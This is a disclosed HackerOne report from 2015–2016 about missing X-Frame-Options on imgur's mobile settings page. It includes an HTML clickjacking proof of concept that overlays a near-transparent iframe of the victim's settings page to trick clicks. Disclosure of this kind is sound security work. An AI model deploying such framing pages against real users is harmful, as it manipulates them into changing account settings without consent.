---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '103178'
original_report_id: '103178'
title: Attack User Privacy Settings - X-Frame-Options missing on m.imgur.com/user/username/settings
weakness: UI Redressing (Clickjacking)
team_handle: imgur
created_at: '2015-12-03T08:43:34.794Z'
disclosed_at: '2016-05-04T04:13:46.364Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- ui-redressing-clickjacking
---

# Attack User Privacy Settings - X-Frame-Options missing on m.imgur.com/user/username/settings

## Metadata

- HackerOne Report ID: 103178
- Weakness: UI Redressing (Clickjacking)
- Program: imgur
- Disclosed At: 2016-05-04T04:13:46.364Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,
I would like to report that almost entire mobile web site is vulnerable to clickjacking attacks, 
Maybe the most important critical part the **/settings** node, 
As an attacker could force a user to change his privacy settings with only two clicks, please see live video demonstration,
of course this is vulnerable under mobile browsers,
Also attached PoC could be tested under desktop browser by changing User-Agent header to a mobile browser (ex: UCBrowser) using User-Agent-Switcher firefox/chrome addon

PoC:
Please change username with your actual username, to successfully test this PoC
```
<html>
<head>
<title>Clickjack test page</title>
        <style>
iframe {
    width: 900px;
    height: 800px;
    /* Use absolute positioning to line up update button with fake button */
    position: absolute;
    top: 100px;
    left: 100px;
    z-index: 2;
    /* Hide from view */
    -moz-opacity: 0.2;
    opacity: 0.2;
    filter: alpha(opacity=0.2);
}
button {
    position: absolute;
    top: 330px;
    left: 100px;
    z-index: 1;
    width: 65px;
}
        </style>
</head
<body>
<p>website is VULNERABLE to click jacking!</p>
<iframe src="http://m.imgur.com/user/username/settings" height="700" width="1000"></iframe>
</body>
</html>
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
